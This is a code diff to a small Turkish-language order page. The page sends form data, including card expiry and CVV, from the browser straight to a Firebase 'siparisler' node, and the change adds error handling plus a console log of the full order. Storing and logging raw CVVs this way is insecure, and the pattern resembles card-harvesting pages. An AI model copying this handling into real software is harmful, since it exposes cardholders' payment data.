@@ -10,6 +10,7 @@
   <style>
     body { font-family: sans-serif; padding: 20px; max-width: 480px; margin: auto; }
     input, select, button { width: 100%; padding: 10px; margin: 10px 0; }
+    #durum { font-weight: bold; color: green; text-align: center; margin-top: 10px; }
   </style>
 </head>
 <body>
@@ -73,9 +74,16 @@
         skt: document.getElementById("skt").value,
         cvv: document.getElementById("cvv").value
       };
+      console.log("Gönderilecek sipariş:", siparis);
       const ref = db.ref("siparisler").push();
-      ref.set(siparis, () => {
-        document.getElementById("durum").innerText = "Sipariş gönderildi!";
+      ref.set(siparis, (error) => {
+        if (error) {
+          document.getElementById("durum").innerText = "❌ Sipariş gönderilemedi!";
+          console.error("Firebase HATA:", error);
+        } else {
+          document.getElementById("durum").innerText = "✅ Sipariş başarıyla gönderildi!";
+          console.log("✅ Firebase'e yazıldı.");
+        }
       });
     }
   </script>
